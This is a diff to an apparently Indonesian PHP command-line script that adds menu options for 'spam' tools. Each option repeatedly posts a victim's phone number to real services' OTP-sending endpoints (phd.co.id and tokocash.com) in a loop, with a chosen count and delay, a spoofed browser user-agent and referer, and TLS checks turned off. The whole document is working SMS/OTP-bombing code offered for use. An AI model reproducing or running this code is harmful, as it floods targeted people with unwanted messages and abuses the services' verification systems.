@@ -90,4 +90,81 @@ $nomor = trim(fgets(STDIN));
 echo "Jumlah Spam?\nMasukan Jumlah spam => ";
 $jumlah = trim(fgets(STDIN));
 echo "Delay? 0-9999999999 \nJeda => ";
-$jeda = t
+$jeda = trim(fgets(STDIN));
+$execute = tokcall($nomor, $jumlah, $jeda);
+print $execute;
+print "Tugas selesai bos !\n";
+}
+elseif($tool == 3){
+    function phd($no, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = json_decode(curl_exec ($ch));
+         if($server_output->status == "OK"){
+            echo "succes kirim ke =>".$no."\n";
+         }else{
+            echo "gagal kirim ke =>".$no."\n";
+         }
+        curl_close ($ch);
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+echo "Masukan No Target ? contoh(0858178365***) \nNo Target =>";
+$nomor = trim(fgets(STDIN));
+echo "Jumlah Spam?\nMasukan Jumlah spam => ";
+$jumlah = trim(fgets(STDIN));
+echo "Delay? 0-9999999999 \nJeda => ";
+$jeda = trim(fgets(STDIN));
+$execute = phd($nomor, $jumlah, $jeda);
+print $execute;
+print "Tugas selesai bos !\n";
+}
+elseif($tool == 4){
+      function toksms($no, $jum, $wait){
+       $x = 0; 
+       while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=1");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = json_decode(curl_exec ($ch));
+          if($server_output->code == 200000){
+            echo "succes kirim ke =>".$no."\n";
+          }else{
+            echo "gagal kirim ke => ".$no."\n";
+          }
+        curl_close ($ch);
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+echo "Masukan No Target ? contoh(0858178365***) \nNo Target =>";
+$nomor = trim(fgets(STDIN));
+echo "Jumlah Spam?\nMasukan Jumlah spam => ";
+$jumlah = trim(fgets(STDIN));
+echo "Delay untuk tools ini 30 detik ! \nJeda => ";
+$jeda = trim(fgets(STDIN));
+$execute = toksms($nomor, $jumlah, $jeda);
+print $execute;
+print "Tugas selesai bos !\n";
+}
+?>
